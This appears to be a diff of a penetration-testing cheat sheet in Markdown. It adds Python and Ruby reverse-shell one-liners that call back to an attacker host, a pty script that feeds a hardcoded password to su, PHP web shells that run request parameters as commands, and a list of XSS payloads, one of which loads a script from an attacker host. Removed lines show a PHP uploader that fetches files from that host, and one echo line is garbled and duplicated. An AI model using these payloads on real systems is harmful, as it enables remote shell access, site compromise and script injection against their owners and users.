+$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+$ python -c 'import pty,subprocess,os,time;(master,slave)=pty.openpty();p=subprocess.Popen(["/bin/su","-c","id","bynarr"],stdin=slave,stdout=slave,stderr=slave);os.read(master,1024);os.write(master,"fruity\n");time.sleep(0.1);print os.read(master,1024);'
+$ echo python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE><(),2);p=subprocess.call(["/bin/sh","-i"]);' > <FILE>
+```
+
+##### Ruby Reverse Shell
+
+```c
+$ ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
 #### Web Shells
 
+##### PHP Web Shell
+
 ```c
-/usr/share/webshells
-<?php echo shell_exe(($_GET['cmd']); ?>
-
-<?php echo "test";?>
-<?php system($_GET['cmd']);?>
-
-<?php file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload']); ?>
-
-<?php if (isset($_GET['upload'])) {file_put_contents($_GET['upload'], file_get_contents("http://<LHOST>:<LPORT>/" . $_GET['upload'])); }; if (isset($_GET['cmd'])) { system($_GET['cmd']); };?>
+<?php system($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+<?php echo passthru($_GET['cmd']); ?>
+<?php passthru($_REQUEST['cmd']); ?>
+<?php echo system($_REQUEST['shell']): ?>
 ```
 
 #### nishang
@@ -1580,4 +2125,55 @@ Connection: close
   },
   "filename":"<FILE>"
 }
+```
+
+#### XSS
+
+> https://github.com/payloadbox/xss-payload-list
+
+##### Basic Payloads
+
+```c
+<script>alert('XSS')</script>
+<scr<script>ipt>alert('XSS')</scr<script>ipt>
+"><script>alert('XSS')</script>
+"><script>alert(String.fromCharCode(88,83,83))</script>
+<script src="http://<LHOST>/<FILE>"></script>
+```
+
+##### IMG Payloads
+
+```c
+<img src=x onerror=alert('XSS');>
+<img src=x onerror=alert('XSS')//
+<img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
+<img src=x:alert(alt) onerror=eval(src) alt=xss>
+"><img src=x onerror=alert('XSS');>
+"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+```
+
+##### SVG Payloads
+
+```c
+<svgonload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg onload=alert(1)//
+<svg/onload=alert(String.fromCharCode(88,83,83))>
+<svg id=alert(1) onload=eval(id)>
+"><svg/onload=alert(String.fromCharCode(88,83,83))>
+"><svg/onload=alert(/XSS/)
+<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
+```
+
+##### DIV Payloads
+
+```c
+<div onpointerover="alert(45)">MOVE HERE</div>
+<div onpointerdown="alert(45)">MOVE HERE</div>
+<div onpointerenter="alert(45)">MOVE HERE</div>
+<div onpointerleave="alert(45)">MOVE HERE</div>
+<div onpointermove="alert(45)">MOVE HERE</div>
+<div onpointerout="alert(45)">MOVE HERE</div>
+<div onpointerup="alert(45)">MOVE HERE</div>
 ```
